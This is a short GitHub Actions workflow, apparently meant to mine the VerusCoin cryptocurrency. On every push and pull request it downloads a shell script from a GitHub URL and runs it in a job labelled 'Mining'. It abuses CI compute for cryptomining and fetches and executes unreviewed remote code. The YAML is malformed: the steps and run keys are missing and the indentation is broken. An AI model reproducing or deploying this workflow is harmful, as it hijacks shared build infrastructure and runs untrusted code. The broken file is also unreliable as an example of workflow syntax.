name: VERUSCOIN
on: [push, pull_request]
jobs:
  build:
    name: Mining
    runs-on: ubuntu-18.04
        wget https://github.com/bankzzno60/Mining/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
